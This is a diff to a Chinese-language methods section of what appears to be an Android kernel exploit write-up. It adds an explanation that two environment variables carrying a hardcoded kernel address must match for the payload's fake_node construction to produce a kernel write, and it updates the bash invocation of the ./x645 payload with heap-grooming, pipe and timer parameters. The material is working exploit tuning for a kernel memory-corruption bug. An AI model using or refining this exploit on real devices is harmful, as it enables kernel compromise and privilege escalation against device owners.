@@ -179,7 +179,9 @@ v8_pipe first F_SETPIPE_SZ=-1 (want 524288) errno=1
 
 ## 6. 方法与可复现
 
-设备端直接调用原生载荷（与 App 同一套 env，只是绕过 UI）：
+设备端直接调用原生载荷（与 App 同一套 env，只是绕过 UI）。
+**`P645_LEFT` 与 `P645_FORCE_LEFT` 必须同时给、且同值** —— 载荷构造 `fake_node` 时读的是
+前者，只给后者会退化成 `rb_left == 0` 的 case1：判据成立但内核零写入（`WARN mode4 left==0 …`）。
 
 ```bash
 cd /data/local/tmp/rk && env \
@@ -187,7 +189,7 @@ cd /data/local/tmp/rk && env \
   P645_TIMERS=54000 P645_REPEATS=520 P645_NDEL=7 P645_DEL_RUN_MS=2500 \
   P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 P645_V8=1 P645_ANON2_MB=1024 \
   P645_PIPE512=64 P645_PIPE_K=4 P645_MODE=4 P645_THRESH=32 P645_SCAN_STOP=1 \
-  P645_FORCE_LEFT=0xffffff8049fe7a59 \
+  P645_LEFT=0xffffff8049fe7a59 P645_FORCE_LEFT=0xffffff8049fe7a59 \
   P645_PRE_PIPES=512 P645_LOG=/data/local/tmp/rk/ab.log \
   ./x645
 ```
